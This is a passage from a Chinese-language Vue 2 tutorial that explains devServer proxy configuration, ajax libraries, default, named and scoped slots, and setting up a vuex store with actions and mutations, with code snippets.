<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;/api&#x27;</span>: &#123; <span class="comment">// 表示请求前缀，发送`ajax`请求时，在端口号后添加该前缀，表示要通过代理服务器进行转发，并且该前缀，会作为请求路径发送给目标服务器</span></span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;&lt;url&gt;&#x27;</span>, <span class="comment">// 代理服务器的路径</span></span><br><span class="line">            <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span> <span class="comment">// 对路径进行匹配替换，将前缀替换为空字符串，如果真实的服务器有这个路径头，就不需要重写</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>, <span class="comment">// 用于支持websocket</span></span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span> <span class="comment">// true配置项，会伪装代理服务的主机端口号，是localhost:5000。false配置项，代理服务器会如实告诉目标服务器自己的主机端口号，是localhost:8080</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;/foo&#x27;</span>: &#123;</span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;&lt;other_url&gt;&#x27;</span>,</span><br><span class="line">            <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;^/foo&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>优点：</p>
<ul>
<li>可以配置多个代理，且可以灵活的控制请求是否走代理</li>
</ul>
<p>缺点：</p>
<ul>
<li>配置略微繁琐，请求资源时必须加前缀</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-2-带有网络请求的案例"><a href="#4-2-带有网络请求的案例" class="headerlink" title="4.2.带有网络请求的案例"></a>4.2.带有网络请求的案例</h2><p><code>github</code>搜索用户案例</p>
<h2 id="4-3-Vue中常用的两个ajax库"><a href="#4-3-Vue中常用的两个ajax库" class="headerlink" title="4.3.Vue中常用的两个ajax库"></a>4.3.<code>Vue</code>中常用的两个<code>ajax</code>库</h2><h3 id="4-3-1-axios"><a href="#4-3-1-axios" class="headerlink" title="4.3.1.axios"></a>4.3.1.<code>axios</code></h3><p>通用的<code>ajax</code>库，官方推荐，使用广泛</p>
<h3 id="4-3-2-vue-resource"><a href="#4-3-2-vue-resource" class="headerlink" title="4.3.2.vue-resource"></a>4.3.2.<code>vue-resource</code></h3><p><code>vue</code>插件库，<code>vue1.x</code>广泛使用，官方已不维护</p>
<h2 id="4-4-slot插槽"><a href="#4-4-slot插槽" class="headerlink" title="4.4.slot插槽"></a>4.4.<code>slot</code>插槽</h2><p>组件标签里面的标签体，也可以添加内容的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Demo&gt;</span><br><span class="line">    &lt;!--标签体内容--&gt;</span><br><span class="line">	&lt;h1&gt;</span><br><span class="line">    &lt;/h1&gt;</span><br><span class="line">&lt;/Demo&gt;</span><br></pre></td></tr></table></figure>

<p><code>vue</code>会对标签体内容进行解析，但是要确定解析后的存放位置</p>
<p>在子组件中，使用<code>&lt;slot&gt;</code>标签标识，告诉<code>vue</code>使用<code>Demo</code>组件时，其标签体内容放在<code>slot</code>对应的位置（挖个坑，等待组件的使用者来填）</p>
<p>传递<code>slot</code>的时机是，在组件使用者全部加载完之后，再替换<code>slot</code></p>
<h3 id="4-4-1-默认插槽"><a href="#4-4-1-默认插槽" class="headerlink" title="4.4.1.默认插槽"></a>4.4.1.默认插槽</h3><p><code>slot</code>可以定义默认值，如果使用组件时没有添加标签体内容，页面渲染时会展示<code>slot</code>的默认内容</p>
<p><code>Demo.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">        &lt;slot&gt;我是一些默认值，当使用者没穿传递组件标签提内容时，我们显示出来&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-2-具名插槽"><a href="#4-4-2-具名插槽" class="headerlink" title="4.4.2.具名插槽"></a>4.4.2.具名插槽</h3><p>理解：挖了坑之后，给每个坑取个名字，将来在使用的时候，确定哪个结构到哪个坑里</p>
<p>定义具名插槽</p>
<p><code>Demo.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">        &lt;slot name=&quot;center&quot;&gt;我是一些默认值，当使用者没穿传递组件标签提内容时，我们显示出来&lt;/slot&gt;</span><br><span class="line">        &lt;slot name=&quot;footer&quot;&gt;我是一些默认值，当使用者没穿传递组件标签提内容时，我们显示出来&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>使用插槽</p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;Demo&gt;</span><br><span class="line">    		&lt;img slot=&quot;center&quot; src=&quot;...&quot;&gt;</span><br><span class="line">            &lt;a slot=&quot;footer&quot;&gt;...&lt;/a&gt;</span><br><span class="line">            &lt;a slot=&quot;footer&quot;&gt;...&lt;/a&gt; //这里是追加，不会覆盖</span><br><span class="line">    	&lt;/Demo&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>如果是多个标签内容，对应同一个插槽，外层可以使用一个<code>div</code>或<code>template</code>包裹</p>
<p>使用<code>div</code>进行包裹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;Demo&gt;</span><br><span class="line">    		&lt;img slot=&quot;center&quot; src=&quot;...&quot;&gt;</span><br><span class="line">            &lt;div slot=&quot;footer&quot;&gt;</span><br><span class="line">            	&lt;a&gt;...&lt;/a&gt;</span><br><span class="line">            	&lt;a&gt;...&lt;/a&gt;</span><br><span class="line">   			&lt;/div&gt;</span><br><span class="line">    	&lt;/Demo&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>使用<code>template</code>进行包裹时，可以使用<code>v-slot:footer</code>的写法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;Demo&gt;</span><br><span class="line">    		&lt;img slot=&quot;center&quot; src=&quot;...&quot;&gt;</span><br><span class="line">            &lt;template v-slot:footer&gt;</span><br><span class="line">            	&lt;a&gt;...&lt;/a&gt;</span><br><span class="line">            	&lt;a&gt;...&lt;/a&gt;</span><br><span class="line">   			&lt;/template&gt;</span><br><span class="line">    	&lt;/Demo&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-3-作用域插槽"><a href="#4-4-3-作用域插槽" class="headerlink" title="4.4.3.作用域插槽"></a>4.4.3.作用域插槽</h3><p>默认操作和具名插槽，解决了<strong>结构传递</strong>的问题。</p>
<p>现在要解决<strong>数据传递</strong>的问题</p>
<p><code>Demo</code>组件的使用者，在使用<code>Demo</code>组件时，可以将数据存放在本身</p>
<p>但现在将数据放在<code>Demo</code>组件中，如果使用者想要用到<code>Demo</code>组件中的数据，需要在定义插槽的时候，<code>Demo</code>组件往插槽上塞一份数据</p>
<p><code>Demo.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">        &lt;slot :games=&quot;games&quot; msg=&quot;hello&quot;&gt;我是一些默认值&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                games: [</span><br><span class="line">                    &#x27;a&#x27;,</span><br><span class="line">                    &#x27;b&#x27;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>那么定义插槽时，数据塞给了谁呢？</p>
<p>塞给了插槽的使用者</p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;Demo&gt;</span><br><span class="line">			&lt;template scope=&quot;receive&quot;&gt; &lt;!-- 该名称可以随意定义 --&gt;</span><br><span class="line">                &#123;&#123;receive&#125;&#125;</span><br><span class="line">                &lt;ul&gt;</span><br><span class="line">                    &lt;li v-for=&quot;itme in receive.games&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt;</span><br><span class="line">    			&lt;/ul&gt;</span><br><span class="line">			&lt;/template&gt;</span><br><span class="line">    	&lt;/Demo&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>页面显示的结果，是一个对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    games: [</span><br><span class="line">        &#x27;a&#x27;,</span><br><span class="line">        &#x27;b&#x27;</span><br><span class="line">    ],</span><br><span class="line">    message: &quot;hello&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用者在用的时候，通过<code>scope</code>定义的变量名进行调用即可</p>
<p>可以通过对象的解构赋值来简化调用过程的书写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;Demo&gt;</span><br><span class="line">			&lt;template scope=&quot;&#123;games&#125;&quot;&gt;</span><br><span class="line">                &#123;&#123;receive&#125;&#125;</span><br><span class="line">                &lt;ul&gt;</span><br><span class="line">                    &lt;li v-for=&quot;itme in games&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt;</span><br><span class="line">    			&lt;/ul&gt;</span><br><span class="line">			&lt;/template&gt;</span><br><span class="line">    	&lt;/Demo&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>也可以写成<code>slot-scope=&#123;games&#125;</code>，就是新旧<code>api</code>的问题</p>
<p>数据是定义在作用域插槽对应的组件中的，最终的结构是由组件的使用者决定的</p>
<h3 id="4-4-4-小结：插槽"><a href="#4-4-4-小结：插槽" class="headerlink" title="4.4.4.小结：插槽"></a>4.4.4.小结：插槽</h3><ul>
<li><p>作用：让父组件可以向子组指定位置插入<code>html</code>结构，也是一种组件间通信方式，适用于<code>父组件</code>&#x3D;&#x3D;&gt; <code>子组件</code></p>
</li>
<li><p>分类：默认插槽、具名插槽和作用域插槽</p>
</li>
<li><p>使用方式：</p>
<ul>
<li><p>默认插槽：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">	&lt;Category&gt;</span><br><span class="line">		&lt;div&gt;</span><br><span class="line">            html结构1</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">	&lt;/Category&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">子组件中：</span><br><span class="line">	&lt;template&gt;</span><br><span class="line">		&lt;div&gt;</span><br><span class="line">             &lt;!-- 定义插槽 --&gt;</span><br><span class="line">            &lt;slot&gt;插槽默认内容&lt;/slot&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">	&lt;/template&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>具名插槽：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">	&lt;Category&gt;</span><br><span class="line">		&lt;template slot=&quot;center&quot;&gt;</span><br><span class="line">			&lt;div&gt;</span><br><span class="line">                html结构1</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;template v-slot=&quot;footer&quot;&gt;</span><br><span class="line">			&lt;div&gt;</span><br><span class="line">                html结构2</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">	&lt;/Category&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">子组件中：</span><br><span class="line">	&lt;template&gt;</span><br><span class="line">		&lt;div&gt;</span><br><span class="line">             &lt;!-- 定义插槽 --&gt;</span><br><span class="line">            &lt;slot name=&quot;center&quot;&gt;插槽默认内容&lt;/slot&gt;</span><br><span class="line">            &lt;slot name=&quot;footer&quot;&gt;插槽默认内容&lt;/slot&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">	&lt;/template&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>作用域插槽</p>
<ul>
<li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要使用者来决定</span>。（<code>games</code>数据在<code>Category</code>中，但使用数据所遍历出来的结构由<code>App</code>组件决定）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">	&lt;Category&gt;</span><br><span class="line">		&lt;template scope=&quot;scopeData&quot;&gt;</span><br><span class="line">			&lt;!-- 生成的是ul列表 --&gt;</span><br><span class="line">			&lt;ul&gt;</span><br><span class="line">                &lt;li v-for=&quot;g in scopeData&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">	&lt;/Category&gt;</span><br><span class="line"></span><br><span class="line">	&lt;Category&gt;</span><br><span class="line">		&lt;template scope=&quot;scopeData&quot;&gt;</span><br><span class="line">			&lt;!-- 生成的是h4标题 --&gt;</span><br><span class="line">			&lt;h4 v-for=&quot;g in scopeData&quot; :key=&quot;g&quot;&gt;</span><br><span class="line">                &#123;&#123;g&#125;&#125;</span><br><span class="line">            &lt;/h4&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">	&lt;/Category&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">子组件中：</span><br><span class="line">	&lt;template&gt;</span><br><span class="line">		&lt;div&gt;</span><br><span class="line">            &lt;slot :game=&quot;games&quot;&gt;&lt;/slot&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">	&lt;/template&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		export default &#123;</span><br><span class="line">            // 数据在子组件自身</span><br><span class="line">            data() &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    games: [&#x27;aa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="5-vuex"><a href="#5-vuex" class="headerlink" title="5.vuex"></a>5.<code>vuex</code></h1><h2 id="5-1-理解vuex"><a href="#5-1-理解vuex" class="headerlink" title="5.1.理解vuex"></a>5.1.理解<code>vuex</code></h2><h3 id="5-1-1-vuex是什么"><a href="#5-1-1-vuex是什么" class="headerlink" title="5.1.1.vuex是什么"></a>5.1.1.<code>vuex</code>是什么</h3><ul>
<li>概念：专门在<code>Vue</code>中实现集中式状态（数据）管理的一个<code>Vue</code>插件，对<code>Vue</code>应用中多个组价的共享状态进行集中的管理（读&#x2F;写），也是一种组件间通信的方式，且适用于任意组件间通信。</li>
<li><code>github</code>：<a target="_blank" rel="noopener" href="https://github.com/vuejs/vuex">https://github.com/vuejs/vuex</a></li>
<li>官方现在推荐的是<code>pinia</code>了：<a target="_blank" rel="noopener" href="https://github.com/vuejs/pinia">https://github.com/vuejs/pinia</a></li>
</ul>
<h3 id="5-1-2-什么时候使用vuex"><a href="#5-1-2-什么时候使用vuex" class="headerlink" title="5.1.2.什么时候使用vuex"></a>5.1.2.什么时候使用<code>vuex</code></h3><ul>
<li>多个组件依赖于同一状态</li>
<li>来自不同组件的行为需要变更同一状态</li>
</ul>
<h3 id="5-1-3-vuex原理图"><a href="#5-1-3-vuex原理图" class="headerlink" title="5.1.3.vuex原理图"></a>5.1.3.<code>vuex</code>原理图</h3><p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220601141825764.png" alt="image-20220601141825764"></p>
<h3 id="5-1-4-搭建vuex环境及使用"><a href="#5-1-4-搭建vuex环境及使用" class="headerlink" title="5.1.4.搭建vuex环境及使用"></a>5.1.4.搭建<code>vuex</code>环境及使用</h3><ul>
<li><code>vue2</code>中，只能够用<code>vuex</code>的3版本</li>
<li><code>vue3</code>中，只能用<code>vuex</code>的4及以上版本</li>
</ul>
<p>创建<code>store</code></p>
<p><code>store/index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>) <span class="comment">// 需要先安装插件，再创建实例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">modules</span>: &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>main.js</code>中引入</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span> <span class="comment">// 默认会找index.js文件</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  store, <span class="comment">// 安装完vuex插件后，store配置项才会出现在vm实例上</span></span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时，<code>vm</code>实例身上就有<code>$store</code>方法了</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220601144453228.png" alt="image-20220601144453228"></p>
<p>使用：</p>
<ul>
<li><p>将需要共享的数据定义在<code>state</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">state</span>: &#123;</span><br><span class="line">  <span class="attr">sum</span>: <span class="number">0</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
<li><p>在组件实例对象中，调用<code>dispatch</code>方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispath</span>(<span class="string">&#x27;jia&#x27;</span>, <span class="variable language_">this</span>.<span class="property">n</span>) <span class="comment">// 传入action类型，并根据需要传入其他参数</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>actions</code>中定义类型</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="attr">jia</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;store中的jia被调用了&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">actiosn</span>: &#123;</span><br><span class="line">    <span class="comment">//简写</span></span><br><span class="line">    <span class="title function_">jia</span>(<span class="params">context, value</span>) &#123;</span><br><span class="line">        <span class="comment">// 有两个默认参数</span></span><br><span class="line">        <span class="comment">// 第一个参数，相当于是mini版的store对象，有commit、dispatch、getters和state等</span></span><br><span class="line">        	<span class="comment">// 如果业务逻辑很多的话，可以再次调用dispatch方法进行业务逻辑分发</span></span><br><span class="line">        	<span class="comment">// 为什么业务逻辑不写在自身呢？</span></span><br><span class="line">        		<span class="comment">// 实现代码复用</span></span><br><span class="line">        		<span class="comment">// 实际业务逻辑会有多个步骤流程，不可能用一次写一次逻辑，</span></span><br><span class="line">        		<span class="comment">// 比如说想要报销，只要传递一个发票号即可，剩下的一大堆验证逻辑，不需要自己管了</span></span><br><span class="line">        <span class="comment">// 第二个参数，是传过来的值</span></span><br><span class="line">        	<span class="comment">// 虽然在这里，可以直接操作state的值，但是不推荐，因为vuex的开发者工具监测的是mutation</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>自定义类型函数里，调用<code>commit</code>方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">actiosn</span>: &#123;</span><br><span class="line">    <span class="comment">//简写</span></span><br><span class="line">    <span class="title function_">jia</span>(<span class="params">context, value</span>) &#123;</span><br><span class="line">		context.<span class="title function_">commit</span>(<span class="string">&#x27;JIA&#x27;</span>, value) <span class="comment">// 同时也要定义mutation类型，一般大写，做个区分</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以用对象的赋值解构写法</p>
